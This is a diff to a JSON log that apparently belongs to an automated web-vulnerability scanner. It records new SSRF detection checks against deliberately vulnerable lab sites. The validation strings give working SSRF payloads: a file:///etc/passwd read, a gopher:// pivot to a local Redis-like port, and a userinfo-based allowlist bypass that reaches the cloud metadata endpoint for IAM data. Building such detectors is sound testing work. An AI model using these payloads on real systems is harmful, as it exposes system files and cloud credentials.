@@ -8411,6 +8411,24 @@
       "slug": "fauxbank-loans-request-live-oracle",
       "status": "shipped",
       "validation": "SOURCE: discovery:url EVIDENCE: POST https://pentest-fauxbank.vercel.app/api/loans creates pending loan visible in GET /api/loans; pentest-fauxbank.vercel.app/loans gains fauxbank-loans-request-live-oracle slug; benchmark juice-shop 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:ssrf.vulnlab.dev",
+      "slug": "ssrf-vulnlab-scheme-route-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /scheme/?url=file:///etc/passwd returns root:x:0:0 /etc/passwd lines; ssrf.vulnlab.dev/scheme findings 8→12 with ssrf-vulnlab-scheme-live-oracle + scheme-route-live-oracle; benchmark juice-shop-staging 13 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:ssrf.vulnlab.dev",
+      "slug": "ssrf-vulnlab-gopher-route-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /gopher/?url=gopher://127.0.0.1:6479/_PING returns +VULNLAB{ssrf-gopher-pivot-to-redis-like-service}; ssrf.vulnlab.dev/gopher findings 7→11 with gopher-live-oracle + gopher-route-live-oracle; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:ssrf.vulnlab.dev",
+      "slug": "ssrf-vulnlab-parser-route-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /parser/?url=http://images.vulnlab.dev@169.254.169.254/latest/meta-data/ bypasses allowlist via userinfo and returns ami-id/iam/instance-id metadata; ssrf.vulnlab.dev/parser findings 7→11 with parser-live-oracle + parser-route-live-oracle; benchmark 6/6 maintained"
     }
   ],
   "shipped": [
@@ -14560,6 +14578,21 @@
       "source": "discovery:nodegoat-websec.herokuapp.com",
       "slug": "nodegoat-learn-open-redirect-route-live-oracle",
       "shipped_at": "2026-07-27T23:30:00.000Z"
+    },
+    {
+      "source": "discovery:ssrf.vulnlab.dev",
+      "slug": "ssrf-vulnlab-scheme-route-live-oracle",
+      "shipped_at": "2026-07-28T00:20:00.000Z"
+    },
+    {
+      "source": "discovery:ssrf.vulnlab.dev",
+      "slug": "ssrf-vulnlab-gopher-route-live-oracle",
+      "shipped_at": "2026-07-28T00:20:00.000Z"
+    },
+    {
+      "source": "discovery:ssrf.vulnlab.dev",
+      "slug": "ssrf-vulnlab-parser-route-live-oracle",
+      "shipped_at": "2026-07-28T00:20:00.000Z"
     }
   ]
 }
